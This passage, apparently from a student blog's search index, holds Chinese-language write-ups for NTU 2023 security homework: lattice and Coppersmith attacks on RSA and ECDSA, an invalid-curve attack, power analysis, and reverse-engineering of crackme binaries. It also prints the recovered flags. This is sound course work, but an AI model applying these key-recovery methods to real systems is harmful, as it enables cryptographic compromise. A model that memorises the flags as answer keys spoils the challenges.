H_1 + 1337 \\cdot d\\cdot r_1 \\cdot {s_1}^{-1} \\end{aligned}\\ \\downarrow \\ d\\cdot (H_2\\cdot {s_2}^{-1} - 1337\\cdot H_1\\cdot {s_1}^{-1})=1337\\cdot r_1\\cdot {s_1}^{-1}-r_2\\cdot {s_2}^{-1}\\ \\hookrightarrow d = {1337\\cdot r_1\\cdot {s_1}^{-1}-r_2\\cdot {s_2}^{-1} \\over H_2\\cdot {s_2}^{-1} - 1337\\cdot H_1\\cdot {s_1}^{-1}} $$ 得到原本的private key $d$之後就可以直接選一個亂數nonce $k$，然後重新自己簽署Give me the FLAG.的signature Lab-coppersmith # Flag: FLAG{RandomPaddingIsImportant}\n解題流程與思路 # 這一題看到e=3直覺會想到小明文攻擊，但是前提除了$e$要很小以外，明文也不能太大，要不然會找很久，他的原理是(假設e=3): $$ \\because C\\equiv m^3\\ mod\\ N\\ \\therefore m^3=C+k\\times N \\ ↪m=\\root 3 \\of {C+k\\times N} $$ 所以可以枚舉很多的k，並且依次開三次方，直到開出整數為止，但就像前面的前提，明文不能太大，不然也會找的很痛苦，此時就可以用到上課教到的coppersmith，解出這樣的問題\nReview Coppersmith Attack 問題：如果有一個${f(x)\\equiv 0\\ (mod\\ N)\\ |x=r, N\\in \\mathbb{Z}, f(x)\\in \\mathbb{Z}{[x]}}$，當$x=r$的時候會同餘$0$ 想求：$r$是多少能符合以上的式子\n首先這個問題因為mod是一個循環，所以正常情況下很難知道$r$多少能符合，因此我們可以簡化一下問題，或者說增加一些限制，這樣在尋找$r$的時候會比較好找一點\n首先構造一個 $$ {Q(x)=s(x)\\cdot f(x)+t(x)\\cdot N\\ (mod\\ N)\\ |\\ Q(r)\\equiv 0\\ (mod\\ N), r\\in \\mathbb{Z}} $$ 在這裡可以先把$r$帶進去這個構造的式子，就會發現其實跟一開始求的問題，也就是$f(x)\\equiv 0\\ (mod\\ N)$其實一樣，但為甚麼要這樣做呢?是因為把問題拉到實數域中求解後比較好做，等我們拿到$r$在實數域得到的root之後就可以帶回去$f(x)$中。\n我們可以把$r$想像成是一個flag，然後flag會有一個最大可能性的上界，也就是$R$，假設flag有32個字元，代表256個bits，我們可以想像$R=2^{256}$，我們不知道flag是多少，但一定在$R$的這個範圍中，且flag一定是整數(換算成int的話)\n所以我們就可以重新寫一個bounded equation $$ Q(r)=|Q_nr^n+\u0026hellip;+Q_2r^2+Q_1r^1+Q_0|\\le |Q_n|R^n+\u0026hellip;+|Q_2|R^2+|Q_1|R+|Q_0| $$ 有了這個bound equation後，我們就可以說 $$ \\because |Q(r)| \u0026lt; |Q(R)| \u0026lt; N且Q(r) ≡ 0\\ mod\\ N\\ \\therefore Q(r)=0 $$ 有了以上條件和說明，此時我們確定把問題拉到實數域上了，現在還不知到$r$為多少\n而要知道$r$就必須知道$Q(r)$，只要得到$Q(r)$再利用找root的sage method就可以直接得到$r$為多少，但在得到$Q(r)$之前我們要先得到$Q(R)$，我們可以利用前面提到的$s(x)\\cdot f(x)+t(x)\\cdot N\\ (mod\\ N)$建一個多項式，然後用matrix表示並把$R$帶入，再利用LLL求shortest vector，此時的shortest vector是以$x=R$為條件帶入，所以只要在各個term把$R$除掉，就可以得到$Q(r)$各個term的係數，然後就求得$r$為多少了，舉例來說：\n在RSA中，已知$c= m^e\\ (mod\\ N)$，當我們今天拿到一個有padding明文(當然我們拿到的是密文，只是知道明文有經過padding，且padding的部分我們知道，另外flag的大小也不能太大，具體能多大可以看影片)，且$e=3$，我們可以rewrite整個式子(假設padding的部分為$a$，flag的部分為$x$) $$ \\begin{aligned} m \u0026amp;= padding + flag\\ c \u0026amp;= m^3 = (padding + flag)^3\\ (mod\\ N)\\ f(x) \u0026amp;= (padding + flag)^3 - c\\ (mod\\ N) \\end{aligned}\\ \\downarrow\\ s(x)\\cdot f(x)+t(x)\\cdot N\\ (mod\\ N)\\ =c_3(x^3 + 3ax^2 + 3a^2x + (a^3 - c)) + (c_2x^2 + c_1x + c_0)\\cdot N\\ =\\begin{bmatrix} c_3, c_2, c_1, c_0 \\end{bmatrix}\\cdot\\begin{bmatrix} x^3 \u0026amp; 3ax^2 \u0026amp; 3a^2x \u0026amp; a^3 - c\\ 0 \u0026amp; Nx^2 \u0026amp; 0 \u0026amp; 0 \\ 0 \u0026amp; 0 \u0026amp; Nx \u0026amp; 0\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; N \\end{bmatrix} $$ $s(x)=c_3$，如果把$f(x)$乘開就會是$x^3 + 3ax^2 + 3a^2x + (a^3 - c)$，而$t(x)=c_2x^2 + c_1x + c_0$。此時把矩陣的$x$帶入上界$R$再利用LLL求shortest vector，也就是 $$ \\begin{bmatrix} c_3R^3\\ (c_33a + c_2N)*R^2\\ (c_33a^2 + c_1N)*R\\ (c_3(a^3-c) + c_0N) \\end{bmatrix}^T $$ 詳細過程如下: $$ \\begin{aligned} M\u0026amp;=\\begin{bmatrix} R^3 \u0026amp; 3aR^2 \u0026amp; 3a^2R \u0026amp; a^3 - c\\ 0 \u0026amp; NR^2 \u0026amp; 0 \u0026amp; 0 \\ 0 \u0026amp; 0 \u0026amp; NR \u0026amp; 0\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; N\\ \\end{bmatrix} | x = R\\ LLL(M)\u0026amp;=\\begin{bmatrix} c_3R^3\\ (c_33a + c_2N)*R^2\\ (c_33a^2 + c_1N)*R\\ (c_3(a^3-c) + c_0N) \\end{bmatrix}^T \\end{aligned}\\ ↪Q(x)=\\begin{bmatrix} c_3\\ c_33a + c_2N\\ c_33a^2 + c_1N\\ c_3(a^3-c) + c_0N \\end{bmatrix}^T\\begin{bmatrix} x^3\\ x^2\\ x^1\\ x^0 \\end{bmatrix}\\le Q(R) = \\begin{bmatrix} Q_3\\ Q_2\\ Q_1\\ Q_0 \\end{bmatrix}^T \\begin{bmatrix} R^3\\ R^2\\ R\\ 1\\ \\end{bmatrix}\\le N $$\n求flag(也就是求得$Q(x)$的root $x_0$) 由以上過程，我們已經取得了$Q(x)$，則我們就可以在實數域中求$Q(x)$的根$x_0$\n基本上這一題就是按照上面講的這樣解就可以了\nHW-invalid_curve_attack # Flag: FLAG{YouAreARealECDLPMaster}\n解題流程與思路 # 觀察source code會發現maple實作了一個沒有檢查我們傳送的點是否在一開始創的橢圓曲線上的elliptiv curve class，然後他把我們給的point當作參數，創立一個初始點，可以看一下下面裡個範例，如果是maple的實作，給予一個根本不在該Elliptic Curve的點他還是會算一個G+G的點給你，只是該點其實是在別的曲線上的2G這個點，反觀正常的sage中的實作會發現只要給予的點不在該曲線上就會直接報錯 :::spoiler maple 實作的Elliptic Curve\n\u0026gt;\u0026gt;\u0026gt; from elliptic_curve_97cadb52fbd7b2cd import Curve, Point \u0026gt;\u0026gt;\u0026gt; p=23 \u0026gt;\u0026gt;\u0026gt; a=5 \u0026gt;\u0026gt;\u0026gt; b=1 \u0026gt;\u0026gt;\u0026gt; E = Curve(p, a, b) \u0026gt;\u0026gt;\u0026gt; G = Point(E, 4, 4) \u0026gt;\u0026gt;\u0026gt; print(G) (4, 4) \u0026gt;\u0026gt;\u0026gt; print(G+G) (19, 3) \u0026gt;\u0026gt;\u0026gt; fake_G = Point(E, 4, 3) \u0026gt;\u0026gt;\u0026gt; print(fake_G+fake_G) (17, 1) :::\n:::spoiler 正常的Elliptic Curve\n\u0026gt;\u0026gt;\u0026gt; from sage.all import * \u0026gt;\u0026gt;\u0026gt; p=23 \u0026gt;\u0026gt;\u0026gt; a=5 \u0026gt;\u0026gt;\u0026gt; b=1 \u0026gt;\u0026gt;\u0026gt; E = EllipticCurve(Zmod(p), [a, b]) \u0026gt;\u0026gt;\u0026gt; G = E(4, 4) \u0026gt;\u0026gt;\u0026gt; print(G) (4 : 4 : 1) \u0026gt;\u0026gt;\u0026gt; fake_G = E(4, 3) Traceback (most recent call last): File \u0026#34;sage/structure/category_object.pyx\u0026#34;, line 839, in sage.structure.category_object.CategoryObject.getattr_from_category (build/cythonized/sage/structure/category_object.c:7216) KeyError: \u0026#39;point_homset\u0026#39; During handling of the above exception, another exception occurred: Traceback (most recent call last): File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/projective/projective_subscheme.py\u0026#34;, line 122, in point return self._point(self.point_homset(), v, check=check) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/elliptic_curves/ell_point.py\u0026#34;, line 259, in __init__ point_homset = curve.point_homset() ^^^^^^^^^^^^^^^^^^ File \u0026#34;sage/structure/category_object.pyx\u0026#34;, line 833, in sage.structure.category_object.CategoryObject.__getattr__ (build/cythonized/sage/structure/category_object.c:7135) File \u0026#34;sage/structure/category_object.pyx\u0026#34;, line 848, in sage.structure.category_object.CategoryObject.getattr_from_category (build/cythonized/sage/structure/category_object.c:7301) File \u0026#34;sage/cpython/getattr.pyx\u0026#34;, line 356, in sage.cpython.getattr.getattr_from_other_class (build/cythonized/sage/cpython/getattr.c:2717) AttributeError: \u0026#39;IntegerModRing_generic_with_category\u0026#39; object has no attribute \u0026#39;__custom_name\u0026#39; During handling of the above exception, another exception occurred: Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/elliptic_curves/ell_generic.py\u0026#34;, line 582, in __call__ return plane_curve.ProjectivePlaneCurve.__call__(self, *args, **kwds) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/generic/scheme.py\u0026#34;, line 266, in __call__ return self.point(args) ^^^^^^^^^^^^^^^^ File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/projective/projective_subscheme.py\u0026#34;, line 124, in point return self._point(self, v, check=check) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ File \u0026#34;/home/sbk6401/anaconda3/envs/sageenv/lib/python3.11/site-packages/sage/schemes/elliptic_curves/ell_point.py\u0026#34;, line 298, in __init__ raise TypeError(\u0026#34;Coordinates %s do not define a point on %s\u0026#34; % (list(v), curve)) TypeError: Coordinates [4, 3, 1] do not define a point on Elliptic Curve defined by y^2 = x^3 + 5*x + 1 over Ring of integers modulo 23 :::\n有了這個性質就可以回去參考一下maple在github上的說明，我們要解決的問題是$hint=Gflag$中的flag到底是甚麼，如果是像前面舉例的那樣($p=23/a=5/b=1/order=31$)很小的order，其實只要直接算discrete_log(K, G, operation='+')就可以了，範例如下，可以看到我先定義K = E(19, 3)，算出discete log=28，事後驗證也證明$K=28G$。但是，像題目中這樣這麼大的order，如果要計算discrete_log的話會非常非常久的時間，總之我先往smooth order的方向思考，也就是說order被factor後其實是由好幾個小的prime所組成，我是直接調整$b$這個不會被Elliptic Curve Multiplication運算使用到的參數(代表其他參數$p, a$要照舊)，然後factor曲線的order看夠不夠smooth，但這樣找也一樣要非常非常久，或者說找到的$b$所得到的order都不夠smooth，最大的prime都還是超過$2^{65}$(e.g. 範例如下)\n\u0026gt;\u0026gt;\u0026gt; G = E.gen(0) \u0026gt;\u0026gt;\u0026gt; print(G) (15 : 1 : 1) \u0026gt;\u0026gt;\u0026gt; K = E(19, 3) \u0026gt;\u0026gt;\u0026gt; discrete_log(K, G, operation=\u0026#39;+\u0026#39;) 28 \u0026gt;\u0026gt;\u0026gt; 28 * G (19 : 3 : 1) sage: p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff ....: a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc ....: b = 56 sage: E = EllipticCurve(Zmod(p), [a, b]) sage: factor(E.order()) 3^3 * 13967 * 67679 * 559243 * 11024719 * 127273871 * 1213196727283 * 171447020014729 * 27796463802665410393 sage: 27796463802665410393.bit_length() 65 所以我開始朝maple的說明繼續前進，如果有invalid curve的問題就可以考慮用Pohlig–Hellman algorithm的方法求出flag為多少，就如同maple在background中提到的，我們選擇不同的$b$所產生的Elliptic Curve Order被factor後不一定有一個超大prime存在，因此我們就可以把問題簡化($n$就是改變$b$之後取得的Elliptic Curve Order) $$ hint=flag*G\\ \\hookrightarrow {n \\over prime}hint=flag\u0026rsquo;\\times {n\\over prime} G\\ flag\u0026rsquo;=discrete_log({n \\over prime}hint, {n\\over prime} G, operation=\u0026rsquo;+\u0026rsquo;) $$\n等我們找到很多個$b$就可以找到很多不同的$flag\u0026rsquo;$，最後我們再用CRT找出真正的$flag$為何就可以了，也就是 $$ flag\\equiv flag\u0026rsquo;\\ (mod\\ prime_1)\\ flag\\equiv flag\u0026rsquo;\u0026rsquo;\\ (mod\\ prime_2)\\ flag\\equiv flag\u0026rsquo;\u0026rsquo;\u0026rsquo;\\ (mod\\ prime_3)\\ \u0026hellip; $$ 所以重點在於要找到足夠多的$flag\u0026rsquo;$和$prime_n$組合\nHW-signature_revenge # 解題流程與思路 # 這一題沒有做出來，但跟一些朋友討論有得出解題的思路\n首先$k_1, k_2$是很特別的組合，他們符合以下式子 $$ k_1 = magic_12^{128} + magic_2\\ k_2 = magic_22^{128} + magic_1 $$ 所以我們可以改寫一下原本的公式 $$ k_1 + tk_2 + u \\equiv 0\\ (mod\\ n)\\ \\to magic_12^{128} + magic_2 + t(magic_22^{128} + magic_1) + u \\equiv 0 (mod\\ n)\\ \\to (t+2^{128})magic_1 + (1 + t2^{128})magic_2+u\\equiv 0 (mod\\ n)\\ \\to magic_1+(1 + t2^{128})(t+2^{128})^{-1}magic_2+(t+2^{128})^{-1}u\\equiv 0 (mod\\ n) $$ 此時新的$t,u$ $$ new_t=(1 + t2^{128})(t+2^{128})^{-1}\\ new_u=(t+2^{128})^{-1}u $$ 建立B matrix 解LLL找最小的vector 有了$magic_1, magic_2$之後就可以爆搜找$d$，並還原出原本的flag HW-Power Anaylysis # Flag: FLAG{W0ckAwocKaWoCka1}\n解題流程與思路 # 這一題全部都是刻出來的，也包含算correlation coefficient，後面才知道numpy有這東西，但反正根據老師上課的作法一步一步跟著做是絕對沒有問題的，包含以下步驟:\nPreprocessing 也就是把pt, ct, pm都按照簡報上的方式排列(各個trace的第一個byte都蒐集在一起，第二個byte都蒐集再一起\u0026hellip;) 計算和sbox key XOR的結果 查表sbox 計算hamming weight model 計算和trace的correlation coefficient 看哪一個結果的數值最大，並把index結果記錄下來算它的ascii repeat以上操作後共可得16 bytes的flag 加速的方法: 可以把整個trace的圖片plot出來看看，會發現題目給的json file是把整段加密的過程記錄下來，所以我們可以只取前一兩百個point就可以完成key的還原 Reference # LFSR # Easiest way to perform modular matrix inversion with Python?\n"},{"id":185,"href":"/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/","title":"NTU CS 2023 HW2 Write Up","section":"Securities","content":" NTU CS 2023 HW2 Write Up # Name: 何秉學 Student ID: R11921A16 :::spoiler TOC [TOC] :::\nLab-HelloRevWorld # Flag: FLAG{h311O_revers1ng_3ngineer5}\n解題流程與思路 # 這一題主要是練習如何把如何把bytes變成字串:\n可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用Y定義他的型別成int dword_2008[32]，前面的int就看每一個字元是來決定，後面[32]就代表有多少字元變成array；第二種方法就是直接按d改變一個字元的型態變成int，然後在edit/Array的地方可以叫出Convert to array的視窗(如果前面沒有先用d改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意) 接著就是在Option/String literals視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style :::spoiler 完整流程 .rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o .rodata:0000000000002009 db 0 .rodata:000000000000200A db 0 .rodata:000000000000200B db 0 .rodata:000000000000200C db 4Ch ; L .rodata:000000000000200D db 0 .rodata:000000000000200E db 0 .rodata:000000000000200F db 0 .rodata:0000000000002010 db 41h ; A .rodata:0000000000002011 db 0 .rodata:0000000000002012 db 0 .rodata:0000000000002013 db 0 .rodata:0000000000002014 db 47h ; G .rodata:0000000000002015 db 0 .rodata:0000000000002016 db 0 .rodata:0000000000002017 db 0 .rodata:0000000000002018 db 7Bh ; { .rodata:0000000000002019 db 0 .rodata:000000000000201A db 0 .rodata:000000000000201B db 0 .rodata:000000000000201C db 68h ; h .rodata:000000000000201D db 0 .rodata:000000000000201E db 0 .rodata:000000000000201F db 0 .rodata:0000000000002020 db 33h ; 3 .rodata:0000000000002021 db 0 .rodata:0000000000002022 db 0 .rodata:0000000000002023 db 0 .rodata:0000000000002024 db 31h ; 1 .rodata:0000000000002025 db 0 .rodata:0000000000002026 db 0 .rodata:0000000000002027 db 0 .rodata:0000000000002028 db 31h ; 1 .rodata:0000000000002029 db 0 .rodata:000000000000202A db 0 .rodata:000000000000202B db 0 .rodata:000000000000202C db 4Fh ; O .rodata:000000000000202D db 0 .rodata:000000000000202E db 0 .rodata:000000000000202F db 0 .rodata:0000000000002030 db 5Fh ; _ .rodata:0000000000002031 db 0 .rodata:0000000000002032 db 0 .rodata:0000000000002033 db 0 .rodata:0000000000002034 db 72h ; r .rodata:0000000000002035 db 0 .rodata:0000000000002036 db 0 .rodata:0000000000002037 db 0 .rodata:0000000000002038 db 65h ; e .rodata:0000000000002039 db 0 .rodata:000000000000203A db 0 .rodata:000000000000203B db 0 .rodata:000000000000203C db 76h ; v .rodata:000000000000203D db 0 .rodata:000000000000203E db 0 .rodata:000000000000203F db 0 .rodata:0000000000002040 db 65h ; e .rodata:0000000000002041 db 0 .rodata:0000000000002042 db 0 .rodata:0000000000002043 db 0 .rodata:0000000000002044 db 72h ; r .rodata:0000000000002045 db 0 .rodata:0000000000002046 db 0 .rodata:0000000000002047 db 0 .rodata:0000000000002048 db 73h ; s .rodata:0000000000002049 db 0 .rodata:000000000000204A db 0 .rodata:000000000000204B db 0 .rodata:000000000000204C db 31h ; 1 .rodata:000000000000204D db 0 .rodata:000000000000204E db 0 .rodata:000000000000204F db 0 .rodata:0000000000002050 db 6Eh ; n .rodata:0000000000002051 db 0 .rodata:0000000000002052 db 0 .rodata:0000000000002053 db 0 .rodata:0000000000002054 db 67h ; g .rodata:0000000000002055 db 0 .rodata:0000000000002056 db 0 .rodata:0000000000002057 db 0 .rodata:0000000000002058 db 5Fh ; _ .rodata:0000000000002059 db 0 .rodata:000000000000205A db 0 .rodata:000000000000205B db 0 .rodata:000000000000205C db 33h ; 3 .rodata:000000000000205D db 0 .rodata:000000000000205E db 0 .rodata:000000000000205F db 0 .rodata:0000000000002060 db 6Eh ; n .rodata:0000000000002061 db 0 .rodata:0000000000002062 db 0 .rodata:0000000000002063 db 0 .rodata:0000000000002064 db 67h ; g .rodata:0000000000002065 db 0 .rodata:0000000000002066 db 0 .rodata:0000000000002067 db 0 .rodata:0000000000002068 db 69h ; i .rodata:0000000000002069 db 0 .rodata:000000000000206A db 0 .rodata:000000000000206B db 0 .rodata:000000000000206C db 6Eh ; n .rodata:000000000000206D db 0 .rodata:000000000000206E db 0 .rodata:000000000000206F db 0 .rodata:0000000000002070 db 65h ; e .rodata:0000000000002071 db 0 .rodata:0000000000002072 db 0 .rodata:0000000000002073 db 0 .rodata:0000000000002074 db 65h ; e .rodata:0000000000002075 db 0 .rodata:0000000000002076 db 0 .rodata:0000000000002077 db 0 .rodata:0000000000002078 db 72h ; r .rodata:0000000000002079 db 0 .rodata:000000000000207A db 0 .rodata:000000000000207B db 0 .rodata:000000000000207C db 35h ; 5 .rodata:000000000000207D db 0 .rodata:000000000000207E db 0 .rodata:000000000000207F db 0 .rodata:0000000000002080 db 7Dh ; } .rodata:0000000000002081 db 0 .rodata:0000000000002082 db 0 .rodata:0000000000002083 db 0 .rodata:0000000000002084 db 0 .rodata:0000000000002085 db 0 .rodata:0000000000002086 db 0 .rodata:0000000000002087 db 0 $\\downarrow$\n.rodata:0000000000002008 dword_2008 dd 46h, 4Ch, 41h, 47h, 7Bh, 68h, 33h, 2 dup(31h), 4Fh, 5Fh, 72h, 65h, 76h, 65h, 72h, 73h, 31h, 6Eh, 67h .rodata:0000000000002008 ; DATA XREF: main+8↑o .rodata:0000000000002008 dd 5Fh, 33h, 6Eh, 67h, 69h, 6Eh, 2 dup(65h), 72h, 35h, 7Dh, 0 $\\downarrow$\n.rodata:0000000000002008 text \u0026#34;UTF-32LE\u0026#34;, \u0026#39;FLAG{h311O_revers1ng_3ngineer5}\u0026#39;,0 :::\nLab-AssemblyDev # Flag: FLAG{c0d1Ng_1n_a5s3mB1y_i5_sO_fun!}\n解題流程與思路 # 這一題有三小題，包含arithmatic.py, data_movement.py, 以及condition.py，過關的條件是要自己寫assembly然後達帶這三個關卡的register或stack條件，我是直接用compiler explorer幫我把c code直接轉assembly然後再利用assembly x86 emulator做double check，速度應該會快很多\n題目一: 就是一般的運算(+-*/) 題目二: 這邊是考register和stack之間的搬運和運算 題目三: 需要考慮condition，然後看要跳轉到哪邊，重點是jump有分signed和unsigned，而仔細看source code他只有考慮unsinged，所以我們要特別挑選jump的類別 HW-crackme_vectorization # Flag: FLAG{yOu_kn0w_hOw_to_r3v3r53_4_m47riX!}\n解題流程與思路 # 一陣基本操作處理完比較好看的狀態後，首先發現一開始先輸入字串的長度(應該是49)，然後我們要輸入一些東西(就是按照前面輸入，總共也是49次)，接著就會進到很醜沒辦法解析的function(我暫時不理他)，一開始我在猜應該是做encryption之類的事情，接著就比對mem，一樣就噴correct這樣，我認為超級醜的function應該不是這次出題的重點，因為要全部逆完真的很有難度，對於學習也沒必要，此時我開始用動態+通靈的方式猜他在幹嘛，依照題目的標題和後面對比字串長度必須要等於7這兩個東西判斷，他應該是在做矩陣之類的操作，而那個醜不拉基的function應該是類似乘法或是加法之類的功能，有了想法就可以實驗他的操作 如果輸入長度49\n內容都是零，毫不意外經過醜不拉基function後都會是零 :::spoiler Result 0x000055aa2b46b4b0│+0x0000: 0x0000000000000000 ← $rdi 0x000055aa2b46b4b8│+0x0008: 0x0000000000000000 0x000055aa2b46b4c0│+0x0010: 0x0000000000000000 0x000055aa2b46b4c8│+0x0018: 0x0000000000000000 0x000055aa2b46b4d0│+0x0020: 0x0000000000000000 0x000055aa2b46b4d8│+0x0028: 0x0000000000000000 0x000055aa2b46b4e0│+0x0030: 0x0000000000000000 0x000055aa2b46b4e8│+0x0038: 0x0000000000000000 0x000055aa2b46b4f0│+0x0040: 0x0000000000000000 0x000055aa2b46b4f8│+0x0048: 0x0000000000000000 0x000055aa2b46b500│+0x0050: 0x0000000000000000 0x000055aa2b46b508│+0x0058: 0x0000000000000000 0x000055aa2b46b510│+0x0060: 0x0000000000000000 0x000055aa2b46b518│+0x0068: 0x0000000000000000 0x000055aa2b46b520│+0x0070: 0x0000000000000000 0x000055aa2b46b528│+0x0078: 0x0000000000000000 0x000055aa2b46b530│+0x0080: 0x0000000000000000 0x000055aa2b46b538│+0x0088: 0x0000000000000000 0x000055aa2b46b540│+0x0090: 0x0000000000000000 0x000055aa2b46b548│+0x0098: 0x0000000000000000 0x000055aa2b46b550│+0x00a0: 0x0000000000000000 0x000055aa2b46b558│+0x00a8: 0x0000000000000000 0x000055aa2b46b560│+0x00b0: 0x0000000000000000 0x000055aa2b46b568│+0x00b8: 0x0000000000000000 0x000055aa2b46b570│+0x00c0: 0x0000000000000000 ::: 內容都是一，經過醜不拉基function後都會每七個都是同一個數字 :::spoiler Result 0x000055d2f80754b0│+0x0000: 0x000003d4000003d4 ← $rdi 0x000055d2f80754b8│+0x0008: 0x000003d4000003d4 0x000055d2f80754c0│+0x0010: 0x000003d4000003d4 0x000055d2f80754c8│+0x0018: 0x000002d8000003d4 0x000055d2f80754d0│+0x0020: 0x000002d8000002d8 0x000055d2f80754d8│+0x0028: 0x000002d8000002d8 0x000055d2f80754e0│+0x0030: 0x000002d8000002d8 0x000055d2f80754e8│+0x0038: 0x0000030f0000030f 0x000055d2f80754f0│+0x0040: 0x0000030f0000030f 0x000055d2f80754f8│+0x0048: 0x0000030f0000030f 0x000055d2f8075500│+0x0050: 0x000003000000030f 0x000055d2f8075508│+0x0058: 0x0000030000000300 0x000055d2f8075510│+0x0060: 0x0000030000000300 0x000055d2f8075518│+0x0068: 0x0000030000000300 0x000055d2f8075520│+0x0070: 0x000003b0000003b0 0x000055d2f8075528│+0x0078: 0x000003b0000003b0 0x000055d2f8075530│+0x0080: 0x000003b0000003b0 0x000055d2f8075538│+0x0088: 0x000003c6000003b0 0x000055d2f8075540│+0x0090: 0x000003c6000003c6 0x000055d2f8075548│+0x0098: 0x000003c6000003c6 0x000055d2f8075550│+0x00a0: 0x000003c6000003c6 0x000055d2f8075558│+0x00a8: 0x0000031e0000031e 0x000055d2f8075560│+0x00b0: 0x0000031e0000031e 0x000055d2f8075568│+0x00b8: 0x0000031e0000031e 0x000055d2f8075570│+0x00c0: 0x000000000000031e ::: 內容都是二，和上面對比全部都會是兩倍 :::spoiler Result 0x0000563c09e664b0│+0x0000: 0x000007a8000007a8 ← $rdi 0x0000563c09e664b8│+0x0008: 0x000007a8000007a8 0x0000563c09e664c0│+0x0010: 0x000007a8000007a8 0x0000563c09e664c8│+0x0018: 0x000005b0000007a8 0x0000563c09e664d0│+0x0020: 0x000005b0000005b0 0x0000563c09e664d8│+0x0028: 0x000005b0000005b0 0x0000563c09e664e0│+0x0030: 0x000005b0000005b0 0x0000563c09e664e8│+0x0038: 0x0000061e0000061e 0x0000563c09e664f0│+0x0040: 0x0000061e0000061e 0x0000563c09e664f8│+0x0048: 0x0000061e0000061e 0x0000563c09e66500│+0x0050: 0x000006000000061e 0x0000563c09e66508│+0x0058: 0x0000060000000600 0x0000563c09e66510│+0x0060: 0x0000060000000600 0x0000563c09e66518│+0x0068: 0x0000060000000600 0x0000563c09e66520│+0x0070: 0x0000076000000760 0x0000563c09e66528│+0x0078: 0x0000076000000760 0x0000563c09e66530│+0x0080: 0x0000076000000760 0x0000563c09e66538│+0x0088: 0x0000078c00000760 0x0000563c09e66540│+0x0090: 0x0000078c0000078c 0x0000563c09e66548│+0x0098: 0x0000078c0000078c 0x0000563c09e66550│+0x00a0: 0x0000078c0000078c 0x0000563c09e66558│+0x00a8: 0x0000063c0000063c 0x0000563c09e66560│+0x00b0: 0x0000063c0000063c 0x0000563c09e66568│+0x00b8: 0x0000063c0000063c 0x0000563c09e66570│+0x00c0: 0x000000000000063c ::: 只有第一個element是1，其他都是零，由結果可知只有七個一數的第一個element會有值，且該值是已經從儲存在原本的執行檔中，比對之後發現一模一樣 :::spoiler Result 0x0000563dd53444b0│+0x0000: 0x000000000000003c (\u0026#34;\u0026lt;\u0026#34;?) ← $rdi 0x0000563dd53444b8│+0x0008: 0x0000000000000000 0x0000563dd53444c0│+0x0010: 0x0000000000000000 0x0000563dd53444c8│+0x0018: 0x0000007300000000 0x0000563dd53444d0│+0x0020: 0x0000000000000000 0x0000563dd53444d8│+0x0028: 0x0000000000000000 0x0000563dd53444e0│+0x0030: 0x0000000000000000 0x0000563dd53444e8│+0x0038: 0x000000000000007a (\u0026#34;z\u0026#34;?) 0x0000563dd53444f0│+0x0040: 0x0000000000000000 0x0000563dd53444f8│+0x0048: 0x0000000000000000 0x0000563dd5344500│+0x0050: 0x0000004100000000 0x0000563dd5344508│+0x0058: 0x0000000000000000 0x0000563dd5344510│+0x0060: 0x0000000000000000 0x0000563dd5344518│+0x0068: 0x0000000000000000 0x0000563dd5344520│+0x0070: 0x0000000000000067 (\u0026#34;g\u0026#34;?) 0x0000563dd5344528│+0x0078: 0x0000000000000000 0x0000563dd5344530│+0x0080: 0x0000000000000000 0x0000563dd5344538│+0x0088: 0x0000007900000000 0x0000563dd5344540│+0x0090: 0x0000000000000000 0x0000563dd5344548│+0x0098: 0x0000000000000000 0x0000563dd5344550│+0x00a0: 0x0000000000000000 0x0000563dd5344558│+0x00a8: 0x00000000000000fa 0x0000563dd5344560│+0x00b0: 0x0000000000000000 0x0000563dd5344568│+0x00b8: 0x0000000000000000 0x0000563dd5344570│+0x00c0: 0x0000000000000000 ::: 由以上實驗可以大致確認醜不拉基function做的事情就是矩陣乘法，而我們知道他比較的乘法結果，也知道和我們輸入的矩陣相乘的乘數，換言之可以反推回我們應該輸入的東西為何\nHW-Banana Donut Verifier # Flag: FLAG{d0_Y0u_l1k3_b4n4Na_d0Nut?}\n解題流程與思路 # 初步的基礎操作逆完之後，主要流程是這樣:\n先輸入1023個char 他會對這1023個char進行一些操作外，主要是運算甜甜圈怎麼畫(對float運算sin和cos) 把我們的input丟到verification function 把原本儲存在程式碼的key也丟到verification function 比對兩個return的結果 一樣就吐Donut likes your input!! :D 我這一題的想法是直接用上一次HW(crackme_vectorization)的思維嘗試找出他的邏輯，以下實驗結果都是在進入verification function之前的user_input\n首先我如果全部輸入\\x00 3D 3A 8B 8A 8A 8A 89 89 88 88 88 88 59 56 54 54 54 56 59 59 27 56 56 57 4B 4B 48 48 49 49 4E 4E 4B F9 F9 F8 07 07 07 05 04 07 07 06 01 01 02 02 01 01 00 B1 B5 BA BA BA BA BA A7 A7 A8 A8 A8 AB ... 如果輸入全部都是\\x10 2D 2A 9B 9A 9A 9A 99 99 98 98 98 98 49 46 44 44 44 46 49 49 37 46 46 47 5B 5B 58 58 59 59 5E 5E 5B E9 E9 E8 17 17 17 15 14 17 17 16 11 11 12 12 11 11 10 A1 A5 AA AA AA AA AA B7 B7 B8 B8 B8 BB ... 